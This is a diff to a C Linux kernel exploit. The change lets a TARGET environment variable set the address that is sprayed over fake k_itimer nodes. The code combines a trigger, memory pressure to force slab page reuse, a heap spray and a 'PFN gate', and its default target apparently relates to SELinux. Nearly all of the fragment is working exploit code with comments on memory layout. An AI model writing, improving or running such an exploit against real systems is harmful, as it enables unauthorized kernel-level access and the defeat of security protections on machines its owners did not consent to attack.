@@ -184,14 +184,20 @@ int main(int argc, char **argv)
     setvbuf(stdout, NULL, _IOLBF, 0);
     g_sh = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (g_sh == MAP_FAILED) return 1;
-    { size_t off; memset(g_pat, 0, sizeof(g_pat));
+    {
+      uint64_t target = SELINUX_MINUS7;
+      const char *e = getenv("TARGET");
+      if (e) target = strtoull(e, NULL, 0);
+      { size_t off; memset(g_pat, 0, sizeof(g_pat));
       /* k_itimer node sits at 0xe0 + n*0x180 inside the page.
        * 0xe0 % 24 == 8 and 0x180 % 24 == 0, so every node offset is ≡ 8 (mod 24):
        * the tiling has to start at phase 8, not 0. */
       for (off = 8; off + 24 <= sizeof(g_pat); off += 24)
-          *(uint64_t *)(g_pat + off + 16) = SELINUX_MINUS7;
-      printf("tiling phase=8, first node at +0x8, last at +0x%zx\n", off - 24); }
-    printf("=== join: trigger + pressure + spray + PFN gate, target=%#llx ===\n", (unsigned long long)SELINUX_MINUS7);
+          *(uint64_t *)(g_pat + off + 16) = target;
+      printf("tiling phase=8, target=%#llx, last node at +0x%zx\n",
+             (unsigned long long)target, off - 24); }
+    }
+    printf("=== join: trigger + pressure + spray + PFN gate ===\n");
     /* Without memory pressure alloc_skb_with_frags hands out order-3 pages, so
      * our 8 KiB records never land on the order-1 slab page we freed. */
     printf("pressure: %d MiB held\n", hold_pressure(63));
